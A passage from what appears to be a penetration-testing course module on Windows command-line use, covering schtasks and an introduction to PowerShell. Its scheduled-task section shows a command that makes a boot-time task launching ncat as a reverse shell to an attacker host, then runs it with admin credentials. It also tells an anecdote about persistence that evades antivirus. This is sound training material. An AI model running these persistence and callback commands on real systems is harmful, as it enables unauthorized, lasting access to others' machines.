&lt;SNIP&gt;
</code></pre>
<p>After doing so, we can see that we have a nice list containing important information such as the <code>Name</code>, <code>ProcessID</code>, <code>StartMode</code>, <code>State</code>, and <code>Status</code> of every service on the system, regardless of whether or not it is currently running.</p>
<p>Note: It is important to be aware that the <code>WMIC</code> command-line utility is currently deprecated as of the current Windows version. As such, it is advised against relying upon using the utility in most situations. You can find further information regarding this change by following this <a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic">link</a>.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>As penetration testers, we will constantly interact with Windows services. Since we will not always have GUI access to a host on which we are trying to escalate privileges, we need to understand how to work with services via the command line in various ways. In a later section, we walk through the PowerShell equivalents for the commands shown in this section and show a more blue team approach to working with and monitoring services. Now that we&#39;ve finished talking about working with services via cmd.exe, let&#39;s dive into the all-important topic of Windows Scheduled Tasks.</p>
<h2 id="working-with-scheduled-tasks">Working With Scheduled Tasks</h2>
<hr>
<p>Scheduled tasks are an excellent way for administrators to ensure that tasks they want to run regularly happen, but they are also an excellent persistence point for attackers. In this section, we will discuss using schtasks to:</p>
<ul>
<li>Learn how to check what tasks exist.</li>
<li>Create a new task to help us automate actions or acquire a shell on the host.</li>
</ul>
<hr>
<h3 id="what-are-scheduled-tasks-">What Are Scheduled Tasks?</h3>
<p>The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually. The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.</p>
<p>Story Time: On several engagements, while pentesting an enterprise environment, I have been in a position where I landed on a host and needed a quick way to set persistence. Instead of doing anything crazy or pulling down another executable onto the host, I decided to search for or create a scheduled task that runs when a user logs in or the host reboots. In this scheduled task, I would set a trigger to open a new socket utilizing PowerShell, reaching out to my Command and Control infrastructure. This would ensure that I could get back in if I lost access to this host. If I were lucky, when the task I chose ran, I might also receive a SYSTEM-level shell back, elevating my privileges at the same time. It quickly ensured host access without setting off alarms with antivirus or data loss prevention systems.</p>
<p><strong>Triggers That Can Kick Off a Scheduled Task</strong></p>
<ul>
<li>When a specific system event occurs.</li>
<li>At a specific time.</li>
<li>At a specific time on a daily schedule.</li>
<li>At a specific time on a weekly schedule.</li>
<li>At a specific time on a monthly schedule.</li>
<li>At a specific time on a monthly day-of-week schedule.</li>
<li>When the computer enters an idle state.</li>
<li>When the task is registered.</li>
<li>When the system is booted.</li>
<li>When a user logs on.</li>
<li>When a Terminal Server session changes state.</li>
</ul>
<p>This list of triggers is extensive and gives us many options for having a task take action. Now that we know what scheduled tasks are and what can make them actionable, it is time to look at using them.</p>
<hr>
<h3 id="how-to-utilize-schtasks">How To Utilize Schtasks</h3>
<p>In the sections provided below, we will go over exactly how we can utilize the <code>schtasks</code> command to its fullest extent. Additionally, as we go over them in greater detail, a formatted table providing the syntax for each action will be provided.</p>
<p>Note that the sections provided here are not an end-all-be-all. Several of the repetitive parameters have been omitted. Be sure to check the help menu <code>/?</code> to see a complete list of what can be used.</p>
<p><strong>Display Scheduled Tasks:</strong></p>
<p><strong>Query Syntax</strong></p>
<table>
<thead>
<tr>
<th><strong>Action</strong></th>
<th><strong>Parameter</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Query</code></td>
<td></td>
<td>Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.</td>
</tr>
<tr>
<td></td>
<td>/fo</td>
<td>Sets formatting options. We can specify to show results in the <code>Table, List, or CSV</code> output.</td>
</tr>
<tr>
<td></td>
<td>/v</td>
<td>Sets verbosity to on, displaying the <code>advanced properties</code> set in displayed tasks when used with the List or CSV output parameter.</td>
</tr>
<tr>
<td></td>
<td>/nh</td>
<td>Simplifies the output using the Table or CSV output format. This switch <code>removes</code> the <code>column headers</code>.</td>
</tr>
<tr>
<td></td>
<td>/s</td>
<td>Sets the DNS name or IP address of the host we want to connect to. <code>Localhost</code> is the <code>default</code> specified. If <code>/s</code> is utilized, we are connecting to a remote host and must format it as &quot;\\host&quot;.</td>
</tr>
<tr>
<td></td>
<td>/u</td>
<td>This switch will tell schtasks to run the following command with the <code>permission set</code> of the <code>user</code> specified.</td>
</tr>
<tr>
<td></td>
<td>/p</td>
<td>Sets the <code>password</code> in use for command execution when we specify a user to run the task. Users must be members of the Administrator&#39;s group on the host (or in the domain). The <code>u</code> and <code>p</code> values are only valid when used with the <code>s</code> parameter.</td>
</tr>
</tbody>
</table>
<p>We can view the tasks that already exist on our host by utilizing the <code>schtasks</code> command like so:</p>
<p>Working With Scheduled Tasks</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; SCHTASKS <span class="hljs-regexp">/Query /</span>V /FO list
<span class="hljs-symbol">
Folder:</span> \  
<span class="hljs-string">HostName:</span>                             DESKTOP-Victim
<span class="hljs-string">TaskName:</span>                             \Check Network Access
Next Run <span class="hljs-string">Time:</span>                        N/A
<span class="hljs-string">Status:</span>                               Ready
Logon <span class="hljs-string">Mode:</span>                           Interactive only
Last Run <span class="hljs-string">Time:</span>                        <span class="hljs-number">11</span><span class="hljs-regexp">/30/</span><span class="hljs-number">1999</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
Last <span class="hljs-string">Result:</span>                          <span class="hljs-number">267011</span>
<span class="hljs-string">Author:</span>                               DESKTOP-Victim\htb-admin
Task To <span class="hljs-string">Run:</span>                          <span class="hljs-string">C:</span>\Windows\System32\cmd.exe ping <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>
Start <span class="hljs-string">In:</span>                             N/A
<span class="hljs-string">Comment:</span>                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task <span class="hljs-string">State:</span>                 Enabled
Idle <span class="hljs-string">Time:</span>                            Disabled
Power <span class="hljs-string">Management:</span>                     Stop On Battery Mode, No Start On Batteries
Run As <span class="hljs-string">User:</span>                          tru7h
Delete Task If Not <span class="hljs-string">Rescheduled:</span>       Disabled
Stop Task If Runs X Hours and X <span class="hljs-string">Mins:</span> <span class="hljs-number">72</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
<span class="hljs-string">Schedule:</span>                             Scheduling data is not available <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> format.
Schedule <span class="hljs-string">Type:</span>                        At system start up
Start <span class="hljs-string">Time:</span>                           N/A
Start <span class="hljs-string">Date:</span>                           N/A
End <span class="hljs-string">Date:</span>                             N/A
<span class="hljs-string">Days:</span>                                 N/A
<span class="hljs-string">Months:</span>                               N/A
<span class="hljs-string">Repeat:</span> <span class="hljs-string">Every:</span>                        N/A
<span class="hljs-string">Repeat:</span> <span class="hljs-string">Until:</span> <span class="hljs-string">Time:</span>                  N/A
<span class="hljs-string">Repeat:</span> <span class="hljs-string">Until:</span> <span class="hljs-string">Duration:</span>              N/A
<span class="hljs-string">Repeat:</span> Stop If Still <span class="hljs-string">Running:</span>        N/A

&lt;SNIP&gt;
</code></pre>
<p>Chaining our parameters with <code>Query</code> allows us to format our output from the standard bulk into a list with advanced settings. The above output shows how the tasks would look in a list format.</p>
<p><strong>Create a New Scheduled Task:</strong></p>
<p><strong>Create Syntax</strong></p>
<table>
<thead>
<tr>
<th><strong>Action</strong></th>
<th><strong>Parameter</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Create</code></td>
<td></td>
<td>Schedules a task to run.</td>
</tr>
<tr>
<td></td>
<td>/sc</td>
<td>Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.</td>
</tr>
<tr>
<td></td>
<td>/tn</td>
<td>Sets the name for the task we are building. Each task must have a unique name.</td>
</tr>
<tr>
<td></td>
<td>/tr</td>
<td>Sets the trigger and task that should be run. This can be an executable, script, or batch file.</td>
</tr>
<tr>
<td></td>
<td>/s</td>
<td>Specify the host to run on, much like in Query.</td>
</tr>
<tr>
<td></td>
<td>/u</td>
<td>Specifies the local user or domain user to utilize</td>
</tr>
<tr>
<td></td>
<td>/p</td>
<td>Sets the Password of the user-specified.</td>
</tr>
<tr>
<td></td>
<td>/mo</td>
<td>Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.</td>
</tr>
<tr>
<td></td>
<td>/rl</td>
<td>Allows us to limit the privileges of the task. Options here are <code>limited</code> access and <code>Highest</code>. Limited is the default value.</td>
</tr>
<tr>
<td></td>
<td>/z</td>
<td>Will set the task to be deleted after completion of its actions.</td>
</tr>
</tbody>
</table>
<p>Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:</p>
<ul>
<li><code>/create</code> : to tell it what we are doing</li>
<li><code>/sc</code> : we must set a schedule</li>
<li><code>/tn</code> : we must set the name</li>
<li><code>/tr</code> : we must give it an action to take</li>
</ul>
<p>Everything else is optional. Let us see an example below of how we could create a task to help us get a shell.</p>
<p><strong>New Task Creation</strong></p>
<p>Working With Scheduled Tasks</p>
<pre><code class="lang-cmd-session">C:\htb&gt; schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

<span class="hljs-keyword">SUCCESS: </span>The scheduled task "My Secret Task" has successfully been created.
</code></pre>
<p>A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user&#39;s AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.</p>
<p>Now let us look at what modifying a task would look like.</p>
<h4 id="change-the-properties-of-a-scheduled-task">Change the Properties of a Scheduled Task</h4>
<p><strong>Change Syntax</strong></p>
<table>
<thead>
<tr>
<th><strong>Action</strong></th>
<th><strong>Parameter</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>-----</td>
<td>-----</td>
<td>-----</td>
</tr>
<tr>
<td><code>Change</code></td>
<td></td>
<td>Allows for modifying existing scheduled tasks.</td>
</tr>
<tr>
<td></td>
<td>/tn</td>
<td>Designates the task to change</td>
</tr>
<tr>
<td></td>
<td>/tr</td>
<td>Modifies the program or action that the task runs.</td>
</tr>
<tr>
<td></td>
<td>/ENABLE</td>
<td>Change the state of the task to Enabled.</td>
</tr>
<tr>
<td></td>
<td>/DISABLE</td>
<td>Change the state of the task to Disabled.</td>
</tr>
</tbody>
</table>
<p>Ok, now let us say we found the <code>hash</code> of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.</p>
<p>Working With Scheduled Tasks</p>
<pre><code class="lang-cmd-session">C:\htb&gt; schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

<span class="hljs-keyword">SUCCESS: </span>The parameters of scheduled task "My Secret Task" have been changed.
</code></pre>
<p>Now to make sure our changes took, we can query for the specific task using the <code>/tn</code> parameter and see:</p>
<p>Working With Scheduled Tasks</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; schtasks <span class="hljs-regexp">/query /</span>tn <span class="hljs-string">"My Secret Task"</span> <span class="hljs-regexp">/V /</span>fo list 
<span class="hljs-symbol">
Folder:</span> \
<span class="hljs-string">HostName:</span>                             DESKTOP-Victim
<span class="hljs-string">TaskName:</span>                             \My Secret Task
Next Run <span class="hljs-string">Time:</span>                        N/A
<span class="hljs-string">Status:</span>                               Ready
Logon <span class="hljs-string">Mode:</span>                           Interactive/Background
Last Run <span class="hljs-string">Time:</span>                        <span class="hljs-number">11</span><span class="hljs-regexp">/30/</span><span class="hljs-number">1999</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
Last <span class="hljs-string">Result:</span>                          <span class="hljs-number">267011</span>
<span class="hljs-string">Author:</span>                               DESKTOP-victim\htb-admin
Task To <span class="hljs-string">Run:</span>                          <span class="hljs-string">C:</span>\Users\Victim\AppData\Local\ncat.exe <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> <span class="hljs-number">8100</span>
Start <span class="hljs-string">In:</span>                             N/A
<span class="hljs-string">Comment:</span>                              N/A
Scheduled Task <span class="hljs-string">State:</span>                 Enabled
Idle <span class="hljs-string">Time:</span>                            Disabled
Power <span class="hljs-string">Management:</span>                     Stop On Battery Mode, No Start On Batteries
Run As <span class="hljs-string">User:</span>                          SYSTEM
Delete Task If Not <span class="hljs-string">Rescheduled:</span>       Disabled
Stop Task If Runs X Hours and X <span class="hljs-string">Mins:</span> <span class="hljs-number">72</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
<span class="hljs-string">Schedule:</span>                             Scheduling data is not available <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> format.
Schedule <span class="hljs-string">Type:</span>                        At system start up

&lt;SNIP&gt;
</code></pre>
<p>It looks like our changes were saved successfully. Managing tasks and making changes is pretty simple. We need to ensure our syntax is correct, or it may not fire. If we want to ensure it works, we can use the <code>/run</code> parameter to kick the task off immediately. We have <code>queried, created, and changed</code> tasks up to this point. Let us look at how to delete them now.</p>
<h4 id="delete-the-scheduled-task-s-">Delete the Scheduled Task(s)</h4>
<p><strong>Delete Syntax</strong></p>
<table>
<thead>
<tr>
<th><strong>Action</strong></th>
<th><strong>Parameter</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Delete</code></td>
<td></td>
<td>Remove a task from the schedule</td>
</tr>
<tr>
<td></td>
<td>/tn</td>
<td>Identifies the task to delete.</td>
</tr>
<tr>
<td></td>
<td>/s</td>
<td>Specifies the name or IP address to delete the task from.</td>
</tr>
<tr>
<td></td>
<td>/u</td>
<td>Specifies the user to run the task as.</td>
</tr>
<tr>
<td></td>
<td>/p</td>
<td>Specifies the password to run the task as.</td>
</tr>
<tr>
<td></td>
<td>/f</td>
<td>Stops the confirmation warning.</td>
</tr>
</tbody>
</table>
<p>Working With Scheduled Tasks</p>
<pre><code class="lang-cmd-session">C:\htb&gt; schtasks /delete  /tn "My Secret Task" 

<span class="hljs-symbol">WARNING: </span>Are you sure you want to remove the task "My Secret Task" (Y/N)?
</code></pre>
<p>Running <code>schtasks /delete</code> is simple enough. The thing to note is that if we do not supply the <code>/F</code> option, we will be prompted, like in the example above, for you to supply input. Using <code>/F</code> will delete the task and suppress the message.</p>
<hr>
<p>Schtasks can be a great way to leverage the host to run actions for us as admins and pentesters. Take some time to practice creating, modifying, and deleting tasks. By now, we should be comfortable with <code>cmd.exe</code> and its workings. Let&#39;s level up and start working in <code>PowerShell</code>!</p>
<h2 id="cmd-vs-powershell">CMD Vs. PowerShell</h2>
<hr>
<p>Up to this point, we have discussed the built-in Windows Command-line interpreter <code>cmd.exe</code>. Moving forward, we will look at Window&#39;s modern successor to CMD, <a href="https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2">PowerShell</a>. This section will cover what PowerShell is, the differences between PowerShell and CMD, how to get help within the CLI, and basic navigation within the CLI.</p>
<hr>
<h3 id="differences">Differences</h3>
<p>PowerShell and CMD are included natively on any Windows host, so we may ask ourselves, &quot;Why would I use one over the other?&quot; Let&#39;s address this quickly. Below is a table with some differences between PowerShell and CMD.</p>
<p><strong>PowerShell and CMD Compared</strong></p>
<table>
<thead>
<tr>
<th><strong>Feature</strong></th>
<th><strong>CMD</strong></th>
<th><strong>PowerShell</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Language</td>
<td>Batch and basic CMD commands only.</td>
<td>PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.</td>
</tr>
<tr>
<td>Command utilization</td>
<td>The output from one command cannot be passed into another directly.</td>
<td>The output from one command can be passed into another directly.</td>
</tr>
<tr>
<td>Command Output</td>
<td>Text only</td>
<td>PowerShell outputs in object formatting.</td>
</tr>
<tr>
<td>Parallel Execution</td>
<td>CMD must finish one command before running another.</td>
<td>PowerShell can multi-thread commands to run in parallel.</td>
</tr>
</tbody>
</table>
<p>Most notably, PowerShell has been built to be <code>extensible</code> and to integrate with many other tools and functionality as needed. Most think of it as just another CLI, but it is much more. Did you know it is also a <code>scripting language</code>? While CMD has been the default command-line interpreter for Windows hosts only, PowerShell has been released as an <a href="https://github.com/PowerShell/PowerShell">open-source project</a> and has an extensive offering of capabilities that support its use with Linux-based systems as well. Using the <code>.NET</code> framework has also made PowerShell capable of utilizing an object base model of interaction and output instead of text-based only.</p>
<h4 id="why-choose-powershell-over-cmd-exe-">Why Choose PowerShell Over cmd.exe?</h4>
<p><code>Why does PowerShell matter for IT admins, Offensive &amp; Defensive Infosec pros</code>?</p>
<p><a href="https://docs.microsoft.com/en-us/powershell/">PowerShell</a> has become increasingly prominent among IT and Infosec professionals. It has widespread utility for System Administrators, Penetration Testers, SOC Analysts, and many other technical disciplines where ever Windows systems are administered. Consider IT admins and Windows system administrators administering IT environments made up of Windows servers, desktops (Windows 10 &amp; 11), Azure, and Microsoft 365 cloud-based applications. Many of them are using PowerShell to automate tasks they must accomplish daily. Among some of these tasks are:</p>
<ul>
<li>Provisioning servers and installing server roles</li>
<li>Creating Active Directory user accounts for new employees</li>
<li>Managing Active Directory group permissions</li>
<li>Disabling and deleting Active Directory user accounts</li>
<li>Managing file share permissions</li>
<li>Interacting with <a href="https://azure.microsoft.com/en-us/">Azure</a> AD and Azure VMs</li>
<li>Creating, deleting, and monitoring directories &amp; files</li>
<li>Gathering information about workstations and servers</li>
<li>Setting up Microsoft Exchange email inboxes for users (in the cloud &amp;/or on-premises)</li>
</ul>
<p>There are countless ways to use PowerShell from an IT admin context, and being mindful of that context can be helpful for us as <code>penetration testers</code> and <code>even as defenders</code>. As a sysadmin, PowerShell can provide us with much more capability than <code>CMD</code>. It is <code>expandable</code>, built for <code>automation</code> and scripting, has a much more robust security implementation, and can handle many different tasks that CMD simply cannot. As a pentester, many well-known capabilities are built into PowerShell. PowerShell&#39;s module import capability makes it easy to bring our tools into the environment and ensure they will work. However, from a stealth perspective, PowerShell&#39;s <code>logging</code> and <code>history</code> capability is powerful and will log more of our interactions with the host. So if we do not need PowerShell&#39;s capabilities and wish to be more stealthy, we should utilize CMD.</p>
<hr>
<h3 id="calling-powershell">Calling PowerShell</h3>
<p>We can access PowerShell directly on a host through the peripherals attached to the local machine or through RDP over the network through various methods.</p>
<ol>
<li>Using Windows <code>Search</code></li>
</ol>
<p>We can type <code>PowerShell</code> in Windows Search to find and launch the PowerShell application and command console.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/SearchingForPowerShell.gif" alt="Searching for PowerShell"></p>
<ol>
<li>Using the Windows <code>Terminal</code> Application</li>
</ol>
<p><a href="https://github.com/Microsoft/Terminal">Windows Terminal</a> is a newer terminal emulator application developed by Microsoft to give anyone using the Windows command line a way to access multiple different command line interfaces, systems, and sub-systems through a single app. This application will likely become the default terminal emulator on Windows operating systems. <img src="https://academy.hackthebox.com/storage/modules/167/PowerShellinWindowsTerminal.gif" alt="PowerShell in Windows Terminal"></p>
<ol>
<li>Using Windows <code>PowerShell ISE</code></li>
</ol>
<p>The <a href="https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7.2">Windows PowerShell Integrated Scripting Environment (ISE)</a> is like an IDE for PowerShell. It can make it easier to develop, debug and test the PowerShell scripts we create. Using PowerShell ISE can be incredibly useful when learning PowerShell.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/PowerShellISE.gif" alt="PowerShell ISE"></p>
<ol>
<li>Using PowerShell in <code>CMD</code></li>
</ol>
<p>We can also launch PowerShell from within CMD. This action may seem trivial, but there will undoubtedly come a time when we can get a shell on a vulnerable Windows target&#39;s CLI via CMD and will benefit from attempting to use PowerShell to further our access on the host and across the network.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/LaunchingPowerShellfromCMD.gif" alt="PowerShell in CMD"></p>
<h4 id="taking-a-look-at-the-shell">Taking a Look at the Shell</h4>
<p>One of the first things we may examine when accessing PowerShell on a local or remote system is the prompt.</p>
<h3 id="powershell-prompt">PowerShell Prompt</h3>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">htb-student</span>&gt; <span class="hljs-selector-tag">ipconfig</span> 

<span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">Network</span> <span class="hljs-selector-tag">Adapter</span> <span class="hljs-selector-tag">VMnet8</span>:

   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . :
   <span class="hljs-selector-tag">Link-local</span> <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span> . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::adb8</span><span class="hljs-selector-pseudo">:3c9</span><span class="hljs-selector-pseudo">:a8af</span><span class="hljs-selector-pseudo">:114</span>%25
   <span class="hljs-selector-tag">IPv4</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.1</span>
   <span class="hljs-selector-tag">Subnet</span> <span class="hljs-selector-tag">Mask</span> . . . . . . . . . . . : 255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span>
   <span class="hljs-selector-tag">Default</span> <span class="hljs-selector-tag">Gateway</span> . . . . . . . . . :
</code></pre>
<p>The prompt is almost identical to what we see in CMD.</p>
<ul>
<li><code>PS</code> is short for PowerShell, followed by the current working directory <code>C:\Users\htb-student&gt;</code>.</li>
<li>This is followed by the cmdlet or string we want to execute, <code>ipconfig</code>.</li>
<li>Finally, below that, we see the output results of our command.</li>
</ul>
<p>Also similar to CMD, PowerShell gives us many commands and cmdlets to utilize. Almost all commands that work in CMD will work in PowerShell. We will only cover some possible commands in this module. It is essential to understand that there is very little utility in memorizing commands. Focus more on understanding context, concepts, and what is possible. Memorization will naturally happen with time spent practicing and repetition.</p>
<hr>
<h3 id="get-help">Get-Help</h3>
<ul>
<li>Using the Help function. If we want to see the options and functionality available to us with a specific cmdlet, we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help?view=powershell-7.2">Get-Help</a> cmdlet.</li>
</ul>
<p><strong>Using Get-Help</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\Users\htb-student&gt; Get-Help Test-Wsman

NAME
    Test-WSMan

SYNTAX
    Test-WSMan [[-ComputerName] <span class="hljs-symbol">&lt;string&gt;</span>] [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
    ClientCertificate | Credssp}] [-Port <span class="hljs-symbol">&lt;int&gt;</span>] [-UseSSL] [-ApplicationName <span class="hljs-symbol">&lt;string&gt;</span>] [-Credential <span class="hljs-symbol">&lt;pscredential&gt;</span>]
    [-CertificateThumbprint <span class="hljs-symbol">&lt;string&gt;</span>]  [<span class="hljs-symbol">&lt;CommonParameters&gt;</span>]


ALIASES
    None


REMARKS
    Get-Help cannot <span class="hljs-keyword">find</span> the Help <span class="hljs-keyword">files</span> <span class="hljs-keyword">for</span> this cmdlet <span class="hljs-keyword">on</span> this computer. It <span class="hljs-keyword">is</span> displaying <span class="hljs-keyword">only</span> partial <span class="hljs-keyword">help</span>.
        -- To download <span class="hljs-built_in">and</span> install Help <span class="hljs-keyword">files</span> <span class="hljs-keyword">for</span> the module that includes this cmdlet, use Update-Help.
        -- To <span class="hljs-keyword">view</span> the Help topic <span class="hljs-keyword">for</span> this cmdlet online, <span class="hljs-built_in">type</span>: <span class="hljs-string">"Get-Help Test-WSMan -Online"</span> <span class="hljs-built_in">or</span>
           <span class="hljs-keyword">go</span> <span class="hljs-keyword">to</span> http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">go</span>.microsoft.<span class="hljs-keyword">com</span>/fwlink/?LinkId=<span class="hljs-number">141464</span>.
</code></pre>
<p>Get-Help can give helpful information about a cmdlet. Notice that the <code>Syntax</code> output shows us several available options and additional keywords that can be used with each option. <code>Aliases</code> are also mentioned, essentially shorter names for our commands. We will discuss Aliases in more depth later in this section. The <code>Remarks</code> output provides us with further information about the cmdlet and even additional options we can use to learn more about the cmdlet. One of these additional options is <code>-online</code>, which will open a Microsoft docs webpage for the corresponding cmdlet if the host has Internet access.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/GetHelpOnline.gif" alt="Get-Help Online"></p>
<p>We can also use a helpful cmdlet called <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/update-help?view=powershell-7.2">Update-Help</a> to ensure we have the most up-to-date information for each cmdlet on the Windows system.</p>
<p><strong>Using Update-Help</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\Windows\system32&gt; <span class="hljs-keyword">Update</span>-Help
</code></pre>
<p>Notice how much more information was populated regarding <code>Test-Wsman</code> after running <code>Update-Help</code>. Feel free to compare this output to the output shown earlier when we first covered Get-Help.</p>
<p><strong>Using Get-Help After Running Update-Help</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\Windows\system32&gt; Get-<span class="hljs-keyword">Help</span>  <span class="hljs-keyword">Test</span>-Wsman

NAME
    <span class="hljs-keyword">Test</span>-WSMan

SYNOPSIS
    Tests whether the WinRM service is running <span class="hljs-keyword">on</span> a <span class="hljs-keyword">local</span> or remote computer.


<span class="hljs-keyword">SYNTAX</span>
    <span class="hljs-keyword">Test</span>-WSMan [[-ComputerName] &lt;System.String&gt;] [-ApplicationName &lt;System.String&gt;]
    [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
    ClientCertificate | Credssp}] [-CertificateThumbprint &lt;System.String&gt;]
    [-Credential &lt;System.Management.Automation.PSCredential&gt;] [-Port &lt;System.Int32&gt;]
    [-UseSSL] [&lt;CommonParameters&gt;]


DESCRIPTION
    The `<span class="hljs-keyword">Test</span>-WSMan` cmdlet submits <span class="hljs-keyword">an</span> identification request that determines
    whether the WinRM service is running <span class="hljs-keyword">on</span> a <span class="hljs-keyword">local</span> or remote computer. <span class="hljs-keyword">If</span> the
    tested computer is running the service, the cmdlet displays the WS-Management
    identity schema, the protocol <span class="hljs-keyword">version</span>, the product vendor, and the product
    <span class="hljs-keyword">version</span> of the tested service.


RELATED LINKS
    Online <span class="hljs-keyword">Version</span>: https:<span class="hljs-comment">//docs.microsoft.com/powershell/module/microsoft.wsman.mana</span>
    gement/<span class="hljs-keyword">test</span>-wsman?<span class="hljs-keyword">view</span>=powershell-5.1&amp;WT.mc_id=ps-gethelp
    Connect-WSMan
    Disable-WSManCredSSP
    Disconnect-WSMan
    Enable-WSManCredSSP
    Get-WSManCredSSP
    Get-WSManInstance
    Invoke-WSManAction
    New-WSManInstance
    New-WSManSessionOption
    Remove-WSManInstance
    <span class="hljs-keyword">Set</span>-WSManInstance
    <span class="hljs-keyword">Set</span>-WSManQuickConfig

REMARKS
    To see the examples, <span class="hljs-keyword">type</span>: <span class="hljs-string">"get-help Test-WSMan -examples"</span>.
    <span class="hljs-keyword">For</span> <span class="hljs-keyword">more</span> information, <span class="hljs-keyword">type</span>: <span class="hljs-string">"get-help Test-WSMan -detailed"</span>.
    <span class="hljs-keyword">For</span> technical information, <span class="hljs-keyword">type</span>: <span class="hljs-string">"get-help Test-WSMan -full"</span>.
    <span class="hljs-keyword">For</span> online <span class="hljs-keyword">help</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">"get-help Test-WSMan -online"</span>
</code></pre>
<hr>
<h3 id="getting-around-in-powershell">Getting Around in PowerShell</h3>
<p>Now that we have covered what PowerShell is and the basics of the built-in help features, let us get into basic navigation and usage of PowerShell.</p>
<h4 id="where-are-we-">Where Are We?</h4>
<p>We can only move around if we know where we are already, right? We can determine our current working directory (in relation to the host system) by utilizing the <code>Get-Location</code> cmdlet.</p>
<p><strong>Get-Location</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Location

<span class="hljs-section">Path
----</span>
C:\Users\DLarusso
</code></pre>
<p>We can see it printed the full path of the directory we are currently working from; in this case, that would be <code>C:\Users\DLarusso</code>. Now that we have our bearings let us look at what objects and files exist within this directory.</p>
<h4 id="list-the-directory">List the Directory</h4>
<p>The <code>Get-ChildItem</code> cmdlet can display the contents of our current directory or the one we specify.</p>
<p><strong>Get-ChildItem</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\htb</span>&gt; <span class="hljs-comment">Get</span><span class="hljs-literal">-</span><span class="hljs-comment">ChildItem</span> 

<span class="hljs-comment">Directory:</span> <span class="hljs-comment">C:\Users\DLarusso</span>


<span class="hljs-comment">Mode</span>                 <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
